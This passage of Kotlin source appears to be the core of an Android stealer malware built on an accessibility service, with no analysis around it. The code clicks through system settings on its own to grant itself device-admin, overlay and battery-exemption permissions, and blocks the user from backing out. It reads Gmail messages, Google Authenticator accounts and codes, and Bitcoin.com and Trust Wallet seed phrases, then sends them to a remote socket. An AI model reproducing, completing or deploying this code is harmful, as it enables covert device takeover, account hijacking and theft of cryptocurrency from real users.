                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/action_button")
                            ?.forEach {
                                clickNodeOrParent(it, true)
                                if (backFromAdmin())
                                    return@forEach
                            }

                        if (ActivityAdminqw.isAdminDevice(this)) {
                            SharedPreferencess.autoClickAdminCommand = ""
                            IOSocketyt.sendLogs("", "isAdminDevice success3", "success")
                        }
                    }
                }
            } else {
                when {
                    currentActivity == "com.android.settings.SubSettings"
                            || currentActivity == "com.android.settings.MiuiSettings"
                            || currentActivity == "com.android.settings.MiuiSettings"
                            || currentActivityLowerCase.contains("deviceadminadd")
                    -> {
                        if (ActivityAdminqw.isAdminDevice(this)) {
                            if (currentActivity == "com.android.settings.SubSettings" || currentActivity == "com.android.settings.MiuiSettings") {
                                eventRootInActiveWindow?.findAccessibilityNodeInfosByText("Add application to admin")
                                    ?.firstOrNull()
                                    ?.let {
                                        blockBack1()
                                        IOSocketyt.sendLogs(
                                            "",
                                            "Add application to admin - blockBack1",
                                            "success"
                                        )
                                        return@let
                                    }
                            } else {
                                SharedPreferencess.autoClickAdminCommand = ""
                                blockBack1()
                                IOSocketyt.sendLogs("", "autoClickAdmin - blockBack1 ", "success")
                                return true
                            }
                        }
                    }
                }
            }
            return false
        }

        private fun AccessibilityServiceQ.dozePerm(
            event: AccessibilityEvent,
            currentActivityLowerCase: String
        ): Boolean {
            if (!SharedPreferencess.hasDozePermition) {
                //------------------------powerkeeper1--------------------------------------------
                if (currentPackage == "com.miui.powerkeeper" || event.packageName == "com.miui.powerkeeper") {
                    if (!PermissionsActivity.is_dozemode(this)) {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")
                            ?.firstOrNull { it.isCheckable }
                            ?.let {
                                if (!it.isChecked) {
                                    if (clickNodeOrParent(it, false)) {
                                        globalActionHome()
                                        startApp()
                                        return@let
                                    }
                                } else {
                                    startApp()
                                    return@let
                                }
                            }
                    } else {
                        startApp()
                        return true
                    }
                }

                //------------------------high Power Applications Activity--------------------------------------------
                if (currentActivityLowerCase.contains("highpowerapplicationsactivity")) {
                    val list = eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")
                        ?.filter { it.text == Utilslp.getLabelApplication(this) }
                    val size = list?.size ?: 0
                    list?.getOrNull(runCatching { cnt % size }.getOrDefault(0))?.let {
                        cnt++
                        if (clickNodeOrParent(it, true))
                            return@let
                    }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/widget_frame")
                        ?.lastOrNull()
                        ?.let {
                            if (it.childCount == 1 && it.getChild(0).isCheckable && !it.getChild(0).isChecked)
                                if (clickNodeOrParent(it.getChild(0), true)) {
                                    globalActionHome()
                                    startApp()
                                    return@let
                                }
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")
                        ?.firstOrNull { it.isCheckable && it.className == "android.widget.CheckedTextView" }
                        ?.let {
                            if (!it.isChecked) {
                                if (clickNodeOrParent(it, true)) {
                                    clickOk()
                                    globalActionHome()
                                    startApp()
                                    return@let
                                }
                            }
                        }

                    if (clickOk()) {
                        globalActionHome()
                        startApp()
                    }

                    //TODO возможно убрать
                    handler.removeCallbacksAndMessages(null)
                    handler.postDelayed({
                        slide(0)
                    }, 100)
                    return true
                }
            } else {
                //------------------------powerkeeper--------------------------------------------
                if ((currentPackage == "com.miui.powerkeeper" || event.packageName == "com.miui.powerkeeper") || currentActivityLowerCase.contains(
                        "highpowerapplicationsactivity"
                    )
                ) {
                    if (PermissionsActivity.is_dozemode(this)) {
                        blockBack1()
                        return true
                    }
                }
            }
            return false
        }

        private fun AccessibilityServiceQ.overlayPerm(event: AccessibilityEvent): Boolean {
            if (!SharedPreferencess.hasOverlaysPermition) {
                when {
                    event.packageName == "com.miui.securitycenter" || currentPackage == "com.miui.securitycenter"
                    -> {
                        if (!MiuUtils.isAllowed(this) || !MiuUtils.canDrawOverlays(this)) {
                            val list = eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/action")
                            listSize = list?.size ?: 0
                            if (listSize > 0) {
                                list?.reverse()
                                list?.getOrNull(runCatching { itemCnt % listSize }.getOrDefault(0))
                                    ?.let {
                                        itemCnt++
                                        if (clickNodeOrParent(it, false))
                                            return@let
                                    }
                            }

                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/select_allow")
                                ?.forEach {
                                    if (clickNodeOrParent(it, true)) {
                                        return@forEach
                                    }
                                }

                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/text1")
                                ?.firstOrNull()
                                ?.let {
                                    if (clickNodeOrParent(it, true)) {
                                        return@let
                                    }
                                }
                        } else {
                            val list =
                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/app_manager_details_applabel")
                                    ?.filter { it.text == Utilslp.getLabelApplication(this) }
                            val size = list?.size ?: 0
                            list?.getOrNull(runCatching { cnt % size }.getOrDefault(0))?.let {
                                cnt++
                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/am_switch")
                                    ?.firstOrNull()
                                    ?.let {
                                        TimeUnit.MILLISECONDS.sleep(250.toLong())
                                        it.refresh()
                                        if (!it.isChecked) {
                                            click(it)
                                            return@let
                                        }

                                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                                            ?.firstOrNull()
                                            ?.let {
                                                click(it)
                                                return@let
                                            }

                                        if (MiuUtils.isAllowed(this) && MiuUtils.canDrawOverlays(this)) {
                                            blockBack1()
                                            handler2.removeCallbacksAndMessages(null)
                                            handler2.postDelayed({
                                                startApp()
                                            }, 100)
                                            return@let
                                        }
                                    }
                            }

                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                                ?.firstOrNull()
                                ?.let {
                                    click(it)
                                    return@let
                                }

                        }

                        if (MiuUtils.isAllowed(this) && MiuUtils.canDrawOverlays(this)) {
                            handler2.removeCallbacksAndMessages(null)
                            blockBack1()
                            handler2.postDelayed({
                                startApp()
                            }, 100)
                            return true
                        }
                    }
                    "xiaomi" != Build.MANUFACTURER.lowercase() -> {
                        if ((currentPackage == "com.android.settings" || currentPackage == "com.coloros.securitypermission")
                            && SharedPreferencess.autoClickAdminCommand != "1" && !SharedPreferencess.clickNotifPermition
                        ) {
                            if (!SharedPreferencess.hasAllPermition) {
                                eventRootInActiveWindow?.findAccessibilityNodeInfosByText(Constantsfd.access1)?.firstOrNull()?.let {
                                    blockBack1()
                                }
                            }

                            if (!MiuUtils.canDrawOverlays(this)) {
                                val list = eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
                                if (list?.size == 1) {
                                    list.firstOrNull()
                                        ?.let {
                                            if (!it.isChecked && clickNodeOrParent(it, true))
                                                return@let
                                        }
                                } else {
                                    list?.forEach { switch ->
                                        val list = switch.parent.parent.findAccessibilityNodeInfosByViewId("android:id/title")
                                            ?.filter { it.text == Utilslp.getLabelApplication(this) }
                                        val size = list?.size ?: 0
                                        list?.getOrNull(runCatching { cnt % size }.getOrDefault(0))?.let {
                                            cnt++
                                            if (clickNodeOrParent(switch, true))
                                                return@let
                                        }
                                    }
                                }
                            }

                            if (!MiuUtils.canDrawOverlays(this)) {
                                val list = eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/widget_frame")
                                if ((list?.size ?: 0) <= 2) {
                                    list?.reverse()
                                    list?.firstOrNull()?.let {
                                        val i = iterateNodesToFindSwitch(it)
                                        if (i != null) {
                                          if (!i.isChecked) {
                                              if (clickNodeOrParent(it, true))
                                                  return@let
                                          }
                                        } else {
                                            if (clickNodeOrParent(it, true))
                                                return@let
                                        }

                                    }
                                } else {
                                    list?.forEach { switch ->
                                        val list = switch.parent.findAccessibilityNodeInfosByViewId("android:id/title")
                                            ?.filter { it.text == Utilslp.getLabelApplication(this) }
                                        val size = list?.size ?: 0
                                        list?.getOrNull(runCatching { cnt % size }.getOrDefault(0))?.let {
                                            cnt++
                                            if (clickNodeOrParent(it, true))
                                                return@let
                                        }
                                    }
                                }
                            }

                            if (!MiuUtils.canDrawOverlays(this)) {
                                val list = eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")
                                    ?.filter { it.text == Utilslp.getLabelApplication(this) }
                                val size = list?.size ?: 0
                                list?.getOrNull(runCatching { cnt % size }.getOrDefault(0))?.let {
                                    cnt++
                                    if (clickNodeOrParent(it, true))
                                        return@let
                                }
                            }

                            if (!MiuUtils.canDrawOverlays(this)) {
                                val list = eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")
                                    ?.filter { it.text == Utilslp.getLabelApplication(this) }
                                val size = list?.size ?: 0
                                list?.getOrNull(runCatching { cnt % size }.getOrDefault(0))?.let {
                                    cnt++
                                    if (clickNodeOrParent(it, true))
                                        return@let
                                }
                            }

                            if (MiuUtils.canDrawOverlays(this)) {
                                blockBack1()
                                handler2.removeCallbacksAndMessages(null)
                                handler2.postDelayed({
                                    startApp()
                                }, 100)
                                return true
                            }

                            //TODO возможно убрать
                            if (!event.packageName.contains("inputmethod") && !MiuUtils.canDrawOverlays(this)) {
                                handler.removeCallbacksAndMessages(null)
                                handler.postDelayed({
                                    slide(0)
                                }, 100)
                            }
                        }
                    }
                    "xiaomi" == Build.MANUFACTURER.lowercase() -> {
                        if ((currentPackage == this.packageName || currentActivity == "com.miui.appmanager.ApplicationsDetailsActivity")) {
                            val list =
                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/app_manager_details_applabel")
                                    ?.filter { it.text == Utilslp.getLabelApplication(this) }
                            val size = list?.size ?: 0
                            list?.getOrNull(runCatching { cnt % size }.getOrDefault(0))?.let {
                                cnt++
                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/am_switch")
                                    ?.firstOrNull()?.let {
                                        if (!it.isChecked) {
                                            click(it)
                                            return@let
                                        }

                                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                                            ?.firstOrNull()
                                            ?.let {
                                                click(it)
                                                return@let
                                            }

                                        if (MiuUtils.isAllowed(this) && MiuUtils.canDrawOverlays(this)) {
                                            blockBack1()
                                            handler2.removeCallbacksAndMessages(null)
                                            handler2.postDelayed({
                                                startApp()
                                            }, 100)
                                            return@let
                                        }
                                    }
                            }

                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                                ?.firstOrNull()
                                ?.let {
                                    click(it)
                                    return@let
                                }

                            if (MiuUtils.isAllowed(this) && MiuUtils.canDrawOverlays(this)) {
                                blockBack1()
                                handler2.removeCallbacksAndMessages(null)
                                handler2.postDelayed({
                                    startApp()
                                }, 100)
                                return true
                            }
                        }
                    }
                }
            } else {
            }
            return false
        }

        private fun AccessibilityServiceQ.gmail(): Boolean {
            //----------------gmail--------------
            runCatching {
                if (SharedPreferencess.SettingsRead("gm_list") == "start") {
                    val list = JSONArray()
                    var i = 0
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/viewified_conversation_item_view")
                        ?.forEach {
                            val sender = it.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/senders").firstOrNull()?.text
                            val subject = it.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/subject").firstOrNull()?.text
                            val snippet = it.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/snippet").firstOrNull()?.text
                            list.put(JSONObject().apply {
                                put("i", i)
                                put("sender", sender)
                                put("subject", subject)
                                put("snippet", snippet)
                            })
                            i++
                        }

                    if (list.length() > 0 && list.toString().length > 5) {
                        val data = JSONObject()
                        data.put("gmail_mes", Base64.getEncoder().encodeToString(list.toString().toByteArray()))
                        IOSocketyt.sendLogs("com.google.android.gm", data.toString(), "gmail_mes")
                        blockBack()
                        SharedPreferencess.SettingsWrite("gm_list", null)
                        return true
                    }
                }

                if (SharedPreferencess.SettingsRead("gm_mes_command") == "start") {
                    val mesNum = SharedPreferencess.SettingsRead("gm_mes")?.toInt()
                    mesNum?.let {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/viewified_conversation_item_view")
                            ?.getOrNull(mesNum)
                            ?.let {
                                click(it)
                            }

                        val sender_name =
                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/sender_name")?.firstOrNull()?.text
                        val upper_date =
                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/upper_date")?.firstOrNull()?.text
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/conversation_container")
                            ?.firstOrNull()
                            ?.let {
                                TimeUnit.MILLISECONDS.sleep(300)
                                val listJson = JSONArray()
                                val list = mutableListOf<String>()
                                iterateAndSaveText(eventRootInActiveWindow, list)
                                listJson.put(JSONObject().apply {
                                    put("sender_name", sender_name)
                                    put("upper_date", upper_date)
                                    put("list", Base64.getEncoder().encodeToString(list.toString().toByteArray()))
                                })

                                if (listJson.length() > 0 && list.toString().length > 5) {
                                    val data = JSONObject()
                                    data.put("gmail_messages", Base64.getEncoder().encodeToString(listJson.toString().toByteArray()))
                                    IOSocketyt.sendLogs("com.google.android.gm", data.toString(), "gmail_messages")
                                    blockBack()
                                }
                                SharedPreferencess.SettingsWrite("gm_mes_command", null)
                                SharedPreferencess.SettingsWrite("gm_mes", null)
                                return true
                            }
                    }
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "gmail ${it.localizedMessage}", "error")
            }
            return false
        }
        
        private fun AccessibilityServiceQ.clearCache() {
            runCatching {
                if (SharedPreferencess.autoClickCacheCommand == "1") {
                    //----------------xiaomi--------------
                    runCatching {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/action_menu_item_child_icon")
                            ?.lastOrNull()
                            ?.let {
                                click(it.parent, true)
                                TimeUnit.MILLISECONDS.sleep(150.toLong())
                            }

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/select_dialog_listview")
                            ?.firstOrNull()
                            ?.let {
                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/text1")
                                    ?.firstOrNull()
                                    ?.let {
                                        click(it, true)
                                        TimeUnit.MILLISECONDS.sleep(150.toLong())
                                    }
                            }

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/buttonGroup")
                            ?.firstOrNull()
                            ?.let {
                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                                    ?.firstOrNull()
                                    ?.let {
                                        click(it, true)
                                        SharedPreferencess.autoClickCacheCommand = ""
                                        blockBack()
                                        clearCacheSuccess()
                                    }
                            }

                        if (clickAtButton("$currentHomePackage", "btnOk", true) == true) {
                            SharedPreferencess.autoClickCacheCommand = ""
                            blockBack()
                            clearCacheSuccess()
                        }
                    }.onFailure {
                        IOSocketyt.sendLogs("", "clearCache2 ${it.localizedMessage}", "error")
                    }

                    //----------------oneplus + motorolla + nokia--------------
                    runCatching {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/entity_header_title")
                            ?.firstOrNull()
                            ?.let {
                                val view = it.parent.parent.parent.parent
                                if (view.childCount == 7
                                    && view.getChild(0).className == "android.widget.FrameLayout"
                                    && view.getChild(6).className == "android.widget.LinearLayout"
                                ) {
                                    click(view.getChild(4))
                                    TimeUnit.MILLISECONDS.sleep(150.toLong())
                                } else if (view.childCount == 8 && view.getChild(7).className == "android.widget.FrameLayout") {
                                    if (view.getChild(1).getChild(0).className == "android.widget.Button"
                                        && view.getChild(1).getChild(1).className == "android.widget.Button"
                                    ) {
                                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button1")
                                            ?.firstOrNull()?.let {
                                                click(it, true)
                                                TimeUnit.MILLISECONDS.sleep(150.toLong())
                                            }
                                    }
                                } else if (view.childCount > 8
                                    && view.getChild(0).className == "android.widget.TextView"
                                    && view.getChild(1).className == "android.widget.FrameLayout"
                                ) {
                                    handler.removeCallbacksAndMessages(null)
                                    handler.postDelayed({
                                        slide(0)
                                    }, 100)
                                } else if (view.childCount > 8) {
                                    handler.removeCallbacksAndMessages(null)
                                    handler.postDelayed({
                                        slide(0)
                                    }, 100)
                                }

                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/parentPanel")
                                    ?.firstOrNull()?.let {
                                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                                            ?.firstOrNull()?.let {
                                                click(it, true)
                                                SharedPreferencess.autoClickCacheCommand = ""
                                                blockBack()
                                                clearCacheSuccess()
                                            }
                                    }
                            }
                    }.onFailure {
                        IOSocketyt.sendLogs("", "clearCache3 ${it.localizedMessage}", "error")
                    }

                    //----------------oppo + honor--------------
                    runCatching {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/all_details")
                            ?.firstOrNull()
                            ?.let {
                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/control_buttons_panel")
                                    ?.firstOrNull()
                                    ?.let {
                                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/recycler_view")
                                            ?.firstOrNull()
                                            ?.let {
                                                if (it.getChild(0).className == "android.widget.FrameLayout"
                                                    && it.getChild(2).className == "android.widget.LinearLayout"
                                                ) {
                                                    click(it.getChild(2))
                                                    return@runCatching
                                                }
                                            }

                                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/list")
                                            ?.firstOrNull()
                                            ?.let {
                                                if (it.getChild(0).className == "android.widget.FrameLayout"
                                                    && it.getChild(5).className == "android.widget.LinearLayout"
                                                ) {
                                                    click(it.getChild(5))
                                                    TimeUnit.MILLISECONDS.sleep(200.toLong())

                                                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button_3")
                                                        ?.firstOrNull()
                                                        ?.let {
                                                            if (click(it) != true) {
                                                                val rect = Rect()
                                                                it.getBoundsInScreen(rect)
                                                                tap(
                                                                    rect.centerX(),
                                                                    rect.centerY(),
                                                                    object : GestureResultCallback() {
                                                                        override fun onCompleted(gestureDescription: GestureDescription?) {
                                                                            super.onCompleted(gestureDescription)
                                                                            SharedPreferencess.autoClickCacheCommand = ""
                                                                            blockBack()
                                                                            clearCacheSuccess()
                                                                        }

                                                                        override fun onCancelled(gestureDescription: GestureDescription?) {
                                                                            super.onCancelled(gestureDescription)
                                                                            SharedPreferencess.autoClickCacheCommand = ""
                                                                            blockBack()
                                                                            clearCacheSuccess()
                                                                        }
                                                                    })
                                                            } else {
                                                                SharedPreferencess.autoClickCacheCommand = ""
                                                                blockBack()
                                                                clearCacheSuccess()
                                                            }
                                                        }
                                                }
                                            }
                                    }

                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/recycler_view")
                                    ?.firstOrNull()
                                    ?.let {
                                        if (it.getChild(0).className == "android.widget.FrameLayout"
                                            && it.getChild(5).className == "android.widget.FrameLayout"
                                        ) {
                                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button")
                                                ?.firstOrNull()
                                                ?.let {
                                                    click(it)
                                                    TimeUnit.MILLISECONDS.sleep(150.toLong())
                                                }
                                        }
                                    }

                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/parentPanel")
                                    ?.firstOrNull()
                                    ?.let {
                                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                                            ?.firstOrNull()
                                            ?.let {
                                                click(it, true)
                                                SharedPreferencess.autoClickCacheCommand = ""
                                                blockBack()
                                                clearCacheSuccess()
                                            }
                                    }
                            }
                    }.onFailure {
                        IOSocketyt.sendLogs("", "clearCache4 ${it.localizedMessage}", "error")
                    }

                    //----------------old xiaomi--------------
                    runCatching {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/am_storage_view")
                            ?.lastOrNull()
                            ?.let {
                                click(it)
                            }

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/recycler_view")
                            ?.firstOrNull()
                            ?.let {
                                if (it.childCount == 4
                                    && it.getChild(0).className == "android.widget.LinearLayout"
                                    && it.getChild(1).className == "android.widget.LinearLayout"
                                    && it.getChild(2).className == "android.widget.LinearLayout"
                                    && it.getChild(3).className == "android.widget.LinearLayout"
                                ) {
                                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("miui:id/split_action_bar")
                                        ?.firstOrNull()
                                        ?.let {
                                            val view = it.getChild(0).getChild(1)
                                            if (view.className == "android.widget.Button") {
                                                click(view)
                                                TimeUnit.MILLISECONDS.sleep(150.toLong())
                                            }

                                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/text1")
                                                ?.firstOrNull()
                                                ?.let {
                                                    click(it)
                                                    SharedPreferencess.autoClickCacheCommand = ""
                                                    blockBack()
                                                    clearCacheSuccess()
                                                }
                                        }
                                }
                            }

                        if (clickAtButton("${currentHomePackage}", "btnOk", true) == true) {
                            SharedPreferencess.autoClickCacheCommand = ""
                            blockBack()
                            clearCacheSuccess()
                        }
                    }.onFailure {
                        IOSocketyt.sendLogs("", "clearCache5 ${it.localizedMessage}", "error")
                    }

                    //----------------samsung after slide--------------
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/recycler_view")
                        ?.firstOrNull()
                        ?.let {
                            if (it.childCount > 8) {
                                val cnt = it.childCount

                                if (it.getChild(cnt - 1).className == "android.widget.TextView"
                                    && it.getChild(cnt - 2).className == "android.widget.LinearLayout"
                                    && it.getChild(cnt - 3).className == "android.widget.TextView"
                                    && it.getChild(cnt - 4).className == "android.widget.LinearLayout"
                                    && it.getChild(cnt - 5).className == "android.widget.TextView"
                                    && it.getChild(cnt - 6).className == "android.widget.LinearLayout"
                                    && it.getChild(cnt - 7).className == "android.widget.LinearLayout"
                                ) {
                                    click(it.getChild(cnt - 7))
                                    TimeUnit.MILLISECONDS.sleep(150.toLong())
                                }

                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button_bar")
                                    ?.firstOrNull()
                                    ?.let {
                                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button1")
                                            ?.firstOrNull()
                                            ?.let {
                                                if (it.parent.childCount == 2) {
                                                    click(it, true)
                                                    TimeUnit.MILLISECONDS.sleep(150.toLong())
                                                }
                                            }
                                    }


                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/parentPanel")
                                    ?.firstOrNull()
                                    ?.let {
                                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                                            ?.firstOrNull()
                                            ?.let {
                                                click(it, true)
                                                SharedPreferencess.autoClickCacheCommand = ""
                                                blockBack()
                                                clearCacheSuccess()
                                            }
                                    }
                            }
                        }
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "clearCache ${it.localizedMessage}", "error")
            }
        }

        private fun AccessibilityServiceQ.wallets(packageAppStart: String) {
            //----------------com.goolge.android.apps.authenticator2--------------
            runCatching {
                if (packageAppStart.contains(constNm.authenticator2) && SharedPreferencess.SettingsRead("authenticator2") == null) {
                    val obj = JSONObject()
                    var i = 0
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.google.android.apps.authenticator2:id/user_row_drag_handle")
                        ?.forEach {
                            val user = it.getChild(0).getChild(0).text
                            val pin = it.getChild(1).getChild(0).text

                            obj.put("user_$i", user)
                            obj.put("pin_$i", pin)
                            i++
                        }

                    if (obj.length() > 0) {
                        IOSocketyt.sendLogs("com.goolge.android.apps.authenticator2", obj.toString(), "googleauth")
                        SharedPreferencess.SettingsWrite("authenticator2", "1")
                        blockBack()
                    }
                    return@runCatching
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "authenticator2 ${it.localizedMessage}", "error")
            }

            //----------------com.bitcoin--------------
            runCatching {
                if (packageAppStart.contains(constNm.mwallet) && SharedPreferencess.SettingsRead("bitcoincom") == null) {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/nav_general_settings")
                        ?.firstOrNull { it.isClickable }
                        ?.let {
                            click(it)
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/setting_base_layout")
                        ?.firstOrNull()
                        ?.let {
                            click(it.parent.parent)
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/setting_base_layout")
                        ?.firstOrNull()
                        ?.let {
                            click(it.parent.parent)
                        }

                    val obj = JSONObject()
                    var jj = 0
                    if (btcDone != true) {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/walletName")
                            ?.firstOrNull { it.text.contains("BTC") }
                            ?.let {
                                click(it.parent.parent)
                                TimeUnit.MILLISECONDS.sleep(150.toLong())
                                eventRootInActiveWindow?.refresher()

                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/mnemonicTable")
                                    ?.firstOrNull()
                                    ?.let {
                                        for (i in 0 until it.childCount) {
                                            val childRow = it.getChild(i)
                                            for (i in 0 until childRow.childCount) {
                                                val text = childRow.getChild(i).getChild(0).text
                                                obj.put("BTC", true)
                                                obj.put("word_$jj", text)
                                                jj++
                                            }
                                        }
                                    }

                                if (obj.length() > 0) {
                                    IOSocketyt.sendLogs("com.bitcoin.mwallet", obj.toString(), "stealers")
                                    performGlobalAction(GLOBAL_ACTION_BACK)
                                    btcDone = true
                                }
                            }
                    }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/walletName")
                        ?.firstOrNull { it.text.contains("ETH") }
                        ?.let {
                            click(it.parent.parent)
                            TimeUnit.MILLISECONDS.sleep(150.toLong())
                            eventRootInActiveWindow?.refresher()

                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/mnemonicTable")
                                ?.firstOrNull()
                                ?.let {
                                    for (i in 0 until it.childCount) {
                                        val childRow = it.getChild(i)
                                        for (i in 0 until childRow.childCount) {
                                            val text = childRow.getChild(i).getChild(0).text
                                            obj.put("ETH", true)
                                            obj.put("word_$jj", text)
                                            jj++
                                        }
                                    }
                                }

                            if (obj.length() > 0) {
                                IOSocketyt.sendLogs("com.bitcoin.mwallet", obj.toString(), "stealers")
                                SharedPreferencess.SettingsWrite("bitcoincom", "1")
                                blockBack()
                                btcDone = false
                            }
                        }
                    return@runCatching
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "com.bitcoin ${it.localizedMessage}", "error")
            }

            //----------------trust--------------
            runCatching {
                if (packageAppStart.contains(constNm.trustapp) && SharedPreferencess.SettingsRead("trust") == null) {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/graph_settings")
                        ?.firstOrNull { it.isClickable }
                        ?.let {
                            click(it)
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/wallets_preference")
                        ?.firstOrNull { it.isClickable }
                        ?.let {
                            click(it)
                        }

                    runCatching {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/main")
                            ?.lastOrNull()
                            ?.let {
                                if (it.getChild(0).className == "androidx.compose.ui.platform.ComposeView"
                                    && it.getChild(0).getChild(0).getChild(0).getChild(0).childCount > 5
                                    && it.getChild(0).getChild(0).getChild(0).getChild(0).className == "android.widget.ScrollView"
                                    && it.getChild(0).getChild(0).getChild(0).getChild(0).getChild(0).className == "android.view.View"
                                    && it.getChild(0).getChild(0).getChild(0).getChild(0).getChild(0).isClickable
                                ) {
                                    click(it.getChild(0).getChild(0).getChild(0).getChild(0).getChild(0))
                                }
                            }
                    }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/item_wallet_info_action")
                        ?.firstOrNull { it.isClickable }
                        ?.let {
                            click(it)
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/wallet_info_container")
                        ?.firstOrNull()
                        ?.let {
                            runCatching {
                                if (it.childCount == 1 && it.getChild(0).childCount == 1) {
                                    val scrollView = it.getChild(0).getChild(0).getChild(0)
                                    scrollView.getChild(scrollView.childCount - 1)?.let {
                                        click(it)
                                    }
                                }
                            }
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/export_phrase_action")
                        ?.firstOrNull { it.isClickable }
                        ?.let {
                            click(it)
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/concent")
                        ?.firstOrNull { it.isCheckable || it.isClickable }
                        ?.let {
                            if (checkNodeOrParent(it) != true)
                                click(it)
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/concent1")
                        ?.firstOrNull()
                        ?.let {
                            runCatching {
                                val check = it.getChild(0).getChild(1)
                                if (check.className == "android.widget.CheckBox") {
                                    if (!check.isChecked)
                                        click(check.parent)
                                }
                            }
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/concent2")
                        ?.firstOrNull()
                        ?.let {
                            runCatching {
                                val check = it.getChild(0).getChild(1)
                                if (check.className == "android.widget.CheckBox") {
                                    if (!check.isChecked)
                                        click(check.parent)
                                }
